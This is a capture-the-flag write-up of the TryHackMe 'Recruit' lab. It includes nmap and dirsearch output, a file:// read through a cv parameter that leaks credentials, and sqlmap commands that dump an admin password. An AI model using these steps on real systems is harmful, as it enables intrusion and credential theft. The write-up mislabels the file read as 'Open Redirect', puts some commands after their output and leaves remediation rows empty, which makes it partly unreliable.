---
{"dg-publish":true,"permalink":"/jr-penetration-tester/recruit/","tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup","#recruit","#jrpenetrationtester"],"noteIcon":"","created":"2026-07-12T09:38:16.427+02:00","updated":"2026-08-02T10:02:43.309+02:00","dg-note-properties":{"tags":["ethicalhacking","offensivesecurity","tryhackme","pentesting","writeup","#recruit","#jrpenetrationtester"]}}
---

![](/img/user/Attachments/redteaming2.png)

--------
## Description


---------
## Recon

Tech stack
SSH DNS PHP 

As always a full nmap scan is required to discover running services and active ports on the system. 

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-12 09:39 +0200  
Nmap scan report for 10.113.170.194  
Host is up (0.021s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT   STATE SERVICE  
22/tcp open  ssh  
53/tcp open  domain  
80/tcp open  http  
  
Nmap done: 1 IP address (1 host up) scanned in 14.68 seconds
```

Once the running ports and services are discovered we move forward to enumerating the identified services and ports. 

[]()![nmap.png](/img/user/nmap.png)

### Hidden Directories

```bash
dirsearch -u http://TARGET
```

```
200 OK 
/config : Not found
/flag.txt : Not found
/login.php
/includes Not found
/register.php Not found
/uploads Not found 
/test Not found
/api/api
/api
/assets
/file.php "missing cv parameter" (point of entry?)
********
301 MOVED REDIRECT
/logout.php
/profile.php
/admin
/admin/index.php
/admin/upload.php
/mail
/dashboard.php
```


**File.php page**
![file.php.page.png](/img/user/file.php.page.png)
### The API 

```
The API is used to fetch for CVs. On the FAQ page /api.php it says /file.php?cv=<URL> is the target endpoint.
``` 

Furthermore: "The API supports fetching CVs from external URLs such as HTTP and HTTPS."

## Enumeration

### Exposed Endpoint with confirmed usernames


Checking out **/mail** endpoint reveals an email sent from HR to IT-support. 
![Screenshot_20260712_210910.png](/img/user/Screenshot_20260712_210910.png)
Valid email format is found and confirmed 
```
it-support@recruit.thm
hr@recruit.thm
```

Furthermore, the mail reveals 2 things.
1. **hr** is a valid username for the login panel.
2. Administrator credentials are stored in the database

-----

## Exploitation

### Open Redirect Vulnerability

- So, the "cv" parameter is required otherwise the frontend shows "missing cv parameter"
- The webserver is setup correctly and enables me to exploit **Open Redirect** with the "file://" scheme and i can now read the **config.php**. 

This means that the library running on this server is older and allows for redirects without validating the second part of the request. Now I can abuse the fact that this library accepts multiple URI schemes, enter a valid URL, which is accepted, enter a file, which the server will accept because the library accepts it and doesnt check the file being requested.

```bash
GET /file.php?cv=file://config.php
```

![open-redirect-success.png](/img/user/open-redirect-success.png)

```


$APP_NAME        = 'Recruit';
$APP_ENV         = 'production';
$APP_VERSION     = '1.2.4';
$APP_DEBUG       = false;

password for HR: hrpassword123
```


----

## Post-exploitation

### Logging in as HR 

Now I have successfully logged in as HR and retrieved the first flag. 
```
THM{LOGGED_IN_USER}
```
![hr-access.png](/img/user/hr-access.png)

So the dashboard doesnt reveal much other than people and a flag. I already know that the admin credentials are stored in the database. This was discovered by reading the mail.log from /mail endpoint. 

### On the hunt for the database

Trying to use the same tactic to read other sensitive files. First attempt was at **db.php** which gave an access denied.

![db.php-access-denied.png](/img/user/db.php-access-denied.png)

Looking at the **search field** in the dashboard panel it is confirmed that SQL Injection is present.

![sql-injection-confirmed 1.png](/img/user/sql-injection-confirmed%201.png)


Running the request through Burp and sending it to sqlmap indeed reveals payloads I can use to exploit the weak database and capture the admin credentials.

![sqlmap.png](/img/user/sqlmap.png)

```bash
sqlmap --batch --level=5 -r searchfield.req
```


```bash
available databases [6]:  
[*] information_schema  
[*] mysql  
[*] performance_schema  
[*] phpmyadmin  
[*] recruit_db  
[*] sys
```

Lets enumerate the databases.

```bash
sqlmap --batch --level=5 -r searchfield.req --dbs
```

```bash
Database: recruit_db  
[2 tables]  
+------------+  
| candidates |  
| users      |  
+------------+
```

```bash
sqlmap --batch --level=5 -r searchfield.req -D recruit_db --tables
```

Lets enumerate the tables. 

```bash
Database: recruit_db  
Table: users  
[1 entry]  
+----+----------------+----------+  
| id | password       | username |  
+----+----------------+----------+  
| 1  | admin@001admin | admin    |  
+----+----------------+----------+
```

```bash
sqlmap --batch --level=5 -r searchfield.req -D recruit_db -T users --dump
```


Now dumping all of the contents from **users** table reveals the administrator password.  

```
THM{LOGGED_IN_ADM1N1}
```
------

## Attack Pattern Analysis (APA) aka Attack Chain

Overview of the attack chain
nmap > weak endpoint vulnerable to Open Redirect  > HR creds > dashboard panel > vulnerable search field SQL injection > 

| Vulnerability                                                                  | Severity | Remediation                                                                                                               |
| ------------------------------------------------------------------------------ | -------- | ------------------------------------------------------------------------------------------------------------------------- |
| Exposed usernames on unprotected endpoints                                     | Medium   | Setup login mechanisms such as by OAuth/JWT/2FA                                                                           |
| Vulnerable library allowing multiple URI schemes and missing proper validation | High     | Use a python library which automatically rejects passing local files in the URL and preventing the abuse of Open Redirect |
| Open Redirect flaw                                                             | Critical |                                                                                                                           |
| SQL Injection                                                                  | High     |                                                                                                                           |
